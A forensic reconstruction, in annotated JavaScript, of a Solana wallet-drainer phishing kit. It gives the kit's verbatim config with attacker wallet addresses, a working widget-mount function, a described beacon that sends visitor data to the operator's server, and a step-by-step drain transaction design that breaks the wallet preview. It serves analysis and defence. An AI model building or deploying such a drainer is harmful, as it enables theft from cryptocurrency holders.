// ============================================================================
// FORENSIC DEOBFUSCATED RECONSTRUCTION — bagsfumbled.com "Kiwi Pro" drain kit
// ----------------------------------------------------------------------------
// Source evidence (captured live, in ../out/):
//   - site_loader.js      parent-page widget (wallet bridge + iframe mount)
//                         + an XOR-obfuscated telemetry IIFE at line ~185
//   - frame_bundle.js     429KB obfuscated webpack bundle = the iframe that
//                         builds + requests signature on the drain tx
//   - frame_sandbox_logs.json   runtime strings recovered via sandboxed execution
//   - tx_raw.json         the real drain tx (3bEYY6...Cf5h) for ground-truth
//
// THIS FILE IS NOT THE ORIGINAL SOURCE. frame_bundle.js is obfuscated and was
// never shipped as readable code, so what follows is a faithful *behavioral*
// reconstruction in clean, annotated JavaScript, for documentation/analysis.
// Every action below is something the evidence shows the real code does.
//
// MALICIOUS-BY-DESIGN: this is a wallet drainer. It exists to trick a victim
// into signing a transaction that empties their token accounts. Do NOT deploy,
// serve, or connect it to a wallet or RPC. Study it in a sandbox only.
// ============================================================================

// ---------------------------------------------------------------------------
// 1. OPERATOR CONFIG  (verbatim from site_loader.js DEFAULT_CONFIG, lines 4-80)
//    This is the "kit buyer" knob panel. Second-person comments ("your split
//    wallet") show it's a white-labeled, resold drainer kit.
// ---------------------------------------------------------------------------
const DEFAULT_CONFIG = {
  /* Bypass Config */
  hideChanges: true, // bypass estimated changes. will show simulation error when
                     // enabled. -> deliberately breaks Phantom/Solflare tx-preview
                     // so the wallet can't show the real balance-change warning.

  /* Spoof Config */
  spoofPrompt: true, // show victim a FAKE incoming-token prompt, not the real tx
  customAirdropMint: "677jK6xujhRFtBcD7Szn32tt2MSv4k6qZ4v3nGMgpump", // fake "airdrop" bait
  customAirdropAmount: 25,          // amount shown on the fake prompt ("25 XP")

  /* Hitter Config */
  targetWallet: "AdmQNzoYAR9ReWHszonfhUPfTSZQ5caXKPkkcW562AkH", // operator's 74% split wallet
  userChatId: "-5483712683",        // Telegram group ID for operator alerts
  minValue: 0.1,                    // skip wallets worth less than this (don't drain dust)
  className: "interact-button",     // page button class that opens the modal

  /* Additional Config */
  width: "360px",
  height: "540px",
  useProxyForTokens: true,          // route token/price lookups through operator backend
  stresserSleepMs: 2666,            // timing param to stress wallet simulation RPC
  phantomStressMode: false,         // same purpose; push wallet toward "can't simulate"
  darkMode: true,
  texts: { /* ~40 UI strings, e.g. "Processing claim...", "Please sign fee transaction..." */ },
};

// The second split wallet is NOT in this config object. On-chain evidence
// (tx_raw.json) shows every drain splits ~74% to targetWallet (AdmQNzoY...) and
// ~26% to a hardcoded affiliate wallet 77bKf6Y49TzKacj5fWg3j8ajfLSefLBsbZM92fdjGbLu.
// That 26% cut is the kit-seller's revenue share, baked into frame_bundle.js,
// not exposed to the buyer. (Reconstructed here from ground-truth tx data.)
const AFFILIATE_WALLET = "77bKf6Y49TzKacj5fWg3j8ajfLSefLBsbZM92fdjGbLu"; // 26%
const AFFILIATE_SHARE = 0.26;
const OPERATOR_SHARE = 0.74;

// The on-chain relay program the kit CPIs into. Thin "transfer relay" — see
// ../reconstruction/. Not autonomous drain logic; just an unrecognized-program
// hop so wallet preview doesn't flag a plain Transfer/TransferChecked.
const RELAY_PROGRAM_ID = "HQGGLV1L2ppE2whUTMqtmZrPkbfUcnEG4TpaKKKmJB3p";
const CHECK_WALLET = "CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR"; // kit marker acct
const RELAYER_GAS_SPONSOR = "G1haWfjDGYPExQvCT2bbYpQ83cmrN18SV8C78VHn6uio"; // fronts SOL/rent

// ===========================================================================
// 2. VICTIM TELEMETRY BEACON
//    This is the DEOBFUSCATED content of the XOR blob at site_loader.js:185.
//    (Recovered independently via sandboxed execution; see
//     ../out/PHISHING_SITE_ANALYSIS.md §3 and frame_sandbox_logs.json.)
//    It fires ON PAGE LOAD, before any wallet is connected.
// ===========================================================================
function beaconVictimTelemetry(config) {
  // Step 1: third-party IP geolocation of the visitor (legit service, abused
  // here for victim targeting / filtering).
  //   GET https://ipapi.co/json/   ->  { ip, country, ... }
  //
  // Step 2: POST to the operator's Fly.io backend so a Telegram bot relays a
  // "someone loaded the page" alert into the operator's group, in real time,
  // whether or not the visitor ever connects a wallet.
  //
  //   POST https://hbeugaufg1-8-26hbaaaaddoter.fly.dev/notify-visit
  //   Content-Type: application/json
  //   {
  //     browser, userAgent, ip, flag, country, referrer,
  //     userChatId: "-5483712683"      <- Telegram group chat ID
  //   }
  //
  // (Sandbox capture showed a placeholder host "host-sol-endpoint.com" because
  //  the obfuscator's fetch was intercepted/blocked; the live value is the
  //  fly.dev hostname recovered in the analysis.)
  void config;
}

// ===========================================================================
// 3. PARENT-PAGE WIDGET (the clean ~90% of site_loader.js, faithfully kept)
//    Mounts a same-origin iframe (/frame.html), passes config via URL param,
//    and bridges the wallet provider (which lives in the top window) into the
//    iframe over postMessage. This split exists because injected providers
//    (window.solana etc.) are reliably visible only in the top-level window.
// ===========================================================================
function mountDrainWidget(userConfig) {
  const config = Object.assign({}, DEFAULT_CONFIG, userConfig);
  if (!config.targetWallet) throw new Error("targetWallet is required");

  // Serialize config into the iframe URL / sessionStorage so frame_bundle.js
  // can read it. (encodeConfigToUrl -> JSON.stringify -> encodeURIComponent.)
  const encodedConfig = encodeURIComponent(JSON.stringify(config));
  try { sessionStorage.setItem("__appConfig", encodedConfig); } catch (e) {}

  const iframe = document.createElement("iframe");
  iframe.src = "/frame.html"; // serves frame_bundle.js — the actual drainer
  // ... style/positioning (360x540 modal on desktop, fullscreen on mobile) ...

  // Bridge: the iframe asks the parent to talk to the wallet.
  window.addEventListener("message", (event) => {
    if (!event.data || event.data.source !== "kiwi-pro-iframe") return;

    if (event.data.type === "request-connection") {
      // connect the chosen wallet, then hand the iframe just the public key
      //   -> postMessage { source:"kiwi-pro-loader", type:"wallet-connected",
      //                    payload:{ publicKey, wallet } }
    }
    if (event.data.type === "jupiter-sign-all-transactions") {
      // Jupiter runs in the parent; sign the iframe's txs there and return
      // base64 wire bytes via postMessage.
    }
  });
  return iframe;
}

// Wallet detection/connection supports Phantom, Solflare, and Jupiter (via the
// Wallet Standard). ~150 lines of the loader are just normalizing the wildly
// different return shapes of Jupiter's signTransaction into raw wire bytes.

// ===========================================================================
// 4. THE DRAIN ITSELF  (reconstructed behavior of frame_bundle.js)
//    This is the part with NO clean source. Sequence below is reconstructed
//    from runtime strings (frame_sandbox_logs.json) + the ground-truth tx.
// ===========================================================================
async function runDrainFlow(provider /* connected wallet */, victimPubkey) {
  // (a) ENUMERATE VALUE — read the victim's token accounts + SOL. If total
  //     estimated value < config.minValue, abort (don't bother with dust).
  //     Token/price lookups go through the operator proxy when
  //     useProxyForTokens is true (hides the real queries + can feed spoofed
  //     prices to prioritize what to steal).

  // (b) SHOW THE BAIT — if spoofPrompt, render a fake "you're receiving 25 XP
  //     airdrop" prompt (customAirdropMint/customAirdropAmount). The victim
  //     thinks they're *claiming* tokens, not *sending* them.

  // (c) BUILD THE MALICIOUS TRANSACTION. This is the heart of the crime.
  //     Reconstructed from tx_raw.json — one legacy tx, atomically:
  //
  //       1. SystemProgram.transfer
  //            RELAYER_GAS_SPONSOR -> victim, 0.02 SOL
  //          (gas fronting: the relayer funds a near-empty victim wallet just
  //           enough to open new attacker token accounts in the SAME tx)
  //       2. AssociatedTokenAccount.create  -> ATA for OPERATOR split wallet
  //       3. AssociatedTokenAccount.create  -> ATA for AFFILIATE split wallet
  //       4. relay.transfer_token_2022( amount = operatorShare of pump token )
  //       5. relay.transfer_token_2022( amount = affiliateShare of pump token )
  //       6. relay.transfer_token( amount = operatorShare of USDC )
  //       7. relay.transfer_token( amount = affiliateShare of USDC )
  //
  //     Each relay call CPIs the real Token/Token-2022 program with
  //     authority = VICTIM (the signer). Amounts in the real tx (6 decimals):
  //       pump token: 85631.550219 -> operator | 30086.760888 -> affiliate
  //       USDC      :   162.456853 -> operator |    57.079436 -> affiliate
  //     => a fixed 74/26 operator/affiliate split, identical across assets.

  // (d) SABOTAGE WALLET PREVIEW — hideChanges:true breaks the wallet's
  //     transaction-simulation, so Phantom/Solflare shows a generic
  //     "simulation failed" instead of the real "you will LOSE these tokens"
  //     warning. stresserSleepMs / phantomStressMode further stress the
  //     simulation RPC to push it toward that click-through-able error state.

  // (e) REQUEST THE SIGNATURE — provider.signTransaction(tx). The victim,
  //     seeing the fake airdrop prompt and a broken preview, signs. THIS single
  //     signature is the entire theft — everything else is setup.

  // (f) BROADCAST — send the signed tx to mainnet. Because the gas-sponsor is
  //     fee-payer / co-signer, the attacker fronts cost; the victim's signature
  //     authorizes the token movement. Funds land in operator + affiliate ATAs.

  void provider; void victimPubkey;
}

// ===========================================================================
// SUMMARY OF THE DECEPTION (one paragraph, for a report):
// The site is a white-labeled drainer kit. Its front-end shows a fake airdrop
// (spoofPrompt) while building a transaction that routes the victim's tokens,
// via an unrecognized relay program, 74% to the operator and 26% to the kit
// seller. It deliberately breaks wallet simulation (hideChanges/stresser) so
// the victim can't see the theft before signing, and a pre-connect telemetry
// beacon alerts the operator's Telegram group the moment anyone loads the page.
// ============================================================================
export { DEFAULT_CONFIG, mountDrainWidget, runDrainFlow, beaconVictimTelemetry };
